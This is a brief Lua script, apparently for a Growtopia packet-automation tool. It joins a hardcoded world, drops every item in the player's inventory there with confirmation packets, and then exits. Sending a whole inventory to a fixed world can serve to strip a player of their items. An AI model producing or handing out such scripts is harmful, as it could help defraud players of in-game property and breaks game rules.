-- AUTO
function joinWorld(worldName)
    SendPacket(3, "action|join_request\nname|" .. worldName .. "\ninvitedWorld|0")
    Sleep(500)
end

-- AUTO
function dropWholeInventory()
    Sleep(500)
    local inventory = GetInventory()
    for _, item in pairs(inventory) do
        local qty = item.amount or item.count or 0
        if qty > 0 then
            SendPacket(2, "action|drop\n|itemID|" .. item.id)
            Sleep(50) -- quick pause before confirming
            SendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|" 
                .. item.id .. "|\ncount|" .. qty)
            Sleep(100)
        end
    end
end

-- REPEAT
function exitWorld()
    SendPacket(3, "action|quit_to_exit")
    Sleep(300) -- faster exit
end

-- Main execution
local worldName = "LOL91929|4000"
joinWorld(worldName)
dropWholeInventory()
exitWorld()
